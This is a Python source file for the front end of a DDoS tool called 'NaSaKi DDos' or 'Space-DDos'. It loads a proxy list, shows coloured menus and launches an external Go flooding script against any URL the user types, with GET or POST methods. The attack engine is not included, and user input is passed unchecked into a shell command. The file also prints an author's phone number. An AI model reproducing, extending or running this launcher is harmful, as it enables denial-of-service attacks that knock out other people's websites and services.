from multiprocessing.connection import wait
import socket
import os
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def si():
    print('\x1b[38;2;233;233;233mWelcome to NaSaKi DDos \x1b[38;2;233;233;233mBy TrungHai')
    print("")

def special():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mstress              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

def menu():
    sys.stdout.write(f"\x1b]2;NaSaKi DDos By TrungHai")
    clear()
    print('\x1b[38;2;233;233;233mWelcom to Space-DDos \x1b[38;2;233;233;233mBy Trung Hải & AnVu')
    clear()
    print('\x1b[38;2;233;233;233mWelcom to Space-DDos \x1b[38;2;233;233;233mBy Trung Hải & AnVu')
    print(f'''
   \x1b[38;2;255;165;0m                        .▄▄ ·  ▄▄▄· ▄▄▄·  ▄▄· ▄▄▄ .
   \x1b[38;2;255;165;0m                        ▐█ ▀. ▐█ ▄█▐█ ▀█ ▐█ ▌▪▀▄.▀·
   \x1b[38;2;255;165;0m                        ▐▄▀▀▀█▄ ██▀·▄█▀▀█ ██ ▄▄▐▀▀▪▄
   \x1b[38;2;255;165;0m                         ▐█▄▪▐█▐█▪·•▐█▪ ▐▌▐███▌▐█▄▄▌ 
   \x1b[38;2;255;165;0m                          ▀▀▀▀ .▀    ▀  ▀ ·▀▀▀  ▀▀▀ 
              \x1b[38;2;255;140;0m═══════════════\x1b[38;2;255;165;0m╔═══════════════════╦\x1b[38;2;0;212;14m═══════════════
                             \x1b[38;2;255;140;0m║  \x1b[38;2;255;140;0mZaLo: 0369563113 \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m              ╩═════════╦═════════╩
                  \x1b[38;2;0;212;14m╔════════════════════╩═══════════════════╗
                  \x1b[38;2;255;140;0m║ \x1b[38;2;255;140;0mCảnh Báo Không Copy Dưới Mọi Hình Thức \x1b[38;2;255;140;0m║
                  \x1b[38;2;255;140;0m║       \x1b[38;2;255;140;0mKhông DDoS Web Có Miền .gov      \x1b[38;2;255;140;0m║  
                  \x1b[38;2;255;140;0m║  \x1b[38;2;255;140;0mUsage: space <url> METHODS<GET/POST>  \x1b[38;2;255;140;0m║
                  \x1b[38;2;255;140;0m║  \x1b[38;2;255;140;0mExample: space http://vailon.com/ GET \x1b[38;2;255;140;0m║
                  \x1b[38;2;255;140;0m╚════════════════════════════════════════╝
''')

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14mInput:''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()

               
# METHODS SPACE

        elif "space" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run space.go -site {url} {method} nil')
            except IndexError:
                print('Usage: sever <url> METHODS<GET/POST>')
                print('Example: sever http://vailon.com/ GET')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
            
def login():
    main()

login()
